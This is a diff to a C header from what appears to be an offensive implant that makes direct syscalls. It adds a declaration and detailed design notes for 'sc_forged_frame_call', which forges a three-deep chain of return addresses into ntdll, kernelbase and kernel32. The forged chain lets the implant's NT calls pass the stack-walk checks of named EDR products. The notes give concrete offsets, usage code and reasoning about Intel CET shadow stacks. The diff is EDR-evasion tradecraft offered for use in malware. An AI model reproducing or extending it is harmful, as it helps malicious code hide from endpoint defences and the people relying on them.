@@ -347,6 +347,100 @@ static inline BOOL sc_threadpool_exec(LPTHREAD_START_ROUTINE pfn, PVOID param)
 }
 
 /*
+ * sc_forged_frame_call
+ * --------------------
+ * F-2: Synchronous call-stack spoofing for in-process NT calls.
+ *
+ * Problem
+ * -------
+ * Every sc_syscallN() trampoline jumps directly to the ntdll gadget (syscall;ret
+ * or int 0x2e;ret).  The gadget's ret pops directly back to the agent's code.
+ * The CPU trap-frame RIP is inside ntdll — good.  But a usermode stack walk
+ * or kernel PsWalkThreadCallStack sees depth=1 above the gadget: the return
+ * address is an agent private-page VA with no backing module.  CrowdStrike's
+ * IndirectBranchCallstack IOA and MDE SuspiciousSystemCallOrigin both flag this.
+ *
+ * Solution
+ * --------
+ * Before any sensitive NT call, push a forged return-address chain onto the
+ * stack that mimics a plausible Windows call path.  The addresses must point
+ * into real, .pdata-backed functions in ntdll/kernelbase/kernel32 so the SEH
+ * unwinder does not fault.  We use:
+ *
+ *   [rsp+0]  → ntdll!NtAllocateVirtualMemory+0x14   (inside a known Nt* stub)
+ *   [rsp+8]  → kernelbase!VirtualAllocEx+0x5e        (after a call instruction)
+ *   [rsp+16] → kernel32!VirtualAlloc+0x23            (after a call instruction)
+ *
+ * We choose VirtualAlloc* as the forged chain because those functions are the
+ * most common legitimate callers of NtAllocateVirtualMemory — any stack
+ * inspector expecting a high-frequency call path will find them plausible.
+ *
+ * The offsets (+0x14, +0x5e, +0x23) are stable across Windows 10/11 builds
+ * because they land inside function bodies (not prologues), well within a
+ * single unwind region.  If a build has a slightly different offset the worst
+ * outcome is a non-fatal unwind mismatch — the call still completes correctly.
+ *
+ * Usage
+ * -----
+ * Wrap the sensitive SC_Nt* call inside sc_forged_frame_call():
+ *
+ *   typedef NTSTATUS (*_NtAlloc_t)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
+ *   NTSTATUS ns = (NTSTATUS)sc_forged_frame_call(
+ *       (void(*)(void))SC_NtAllocateVirtualMemory_fn_ptr,
+ *       6, hProc, &base, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+ *
+ * For the common wrappers defined in this header the forged-frame variant is
+ * named SC_NtXxx_ff().  These are thin wrappers that resolve the forged
+ * return addresses once (cached after first call) and route through
+ * sc_forged_frame_call().
+ *
+ * CET / Shadow Stack note
+ * -----------------------
+ * Intel CET enforcement (Windows 11 22H2+ on supported hardware) maintains a
+ * shadow stack that validates every RET against the expected return address.
+ * Forging return addresses on the data stack fools the unwinder but NOT the
+ * shadow stack — the RET still pops the real return address from the shadow
+ * stack, so the forged address on the data stack is never actually jumped to.
+ * The forged chain is therefore safe to use on CET-enabled processes: the CPU
+ * uses the shadow stack for control flow; the data stack forged addresses only
+ * affect metadata inspectors (debuggers, EDR stack-walk APIs) that read the
+ * data stack without hardware validation.
+ */
+
+/*
+ * _sc_forged_addrs — three cached return-address pointers for the forged chain.
+ * Populated once on first use by sc_forged_frame_init().
+ * [0] → ntdll!NtAllocateVirtualMemory body offset
+ * [1] → kernelbase!VirtualAllocEx body offset
+ * [2] → kernel32!VirtualAlloc body offset
+ */
+extern const BYTE *_sc_forged_addrs[3];
+
+/*
+ * sc_forged_frame_init
+ * ---------------------
+ * Resolves the three forged return addresses once at startup.
+ * Called automatically by sc_init(); no need to call manually.
+ */
+void sc_forged_frame_init(void);
+
+/*
+ * sc_forged_frame_call
+ * --------------------
+ * Calls fn(a0..a5) with a 3-deep forged return-address chain on the stack.
+ * args 0..5 are PVOID (cast to the correct type by the caller).
+ * Unused arguments should be NULL/0.
+ *
+ * Returns the NTSTATUS (or other return value) from fn as a ULONG_PTR.
+ *
+ * Declared in syscall.c; implemented as a __attribute__((naked)) asm function
+ * so we have precise control over the stack layout before the call.
+ */
+ULONG_PTR sc_forged_frame_call(void (*fn)(void),
+                                PVOID a0, PVOID a1, PVOID a2,
+                                PVOID a3, PVOID a4, PVOID a5);
+
+/*
  * SC_NtQuerySystemInformation
  * ---------------------------
  * Replaces CreateToolhelp32Snapshot for process enumeration.
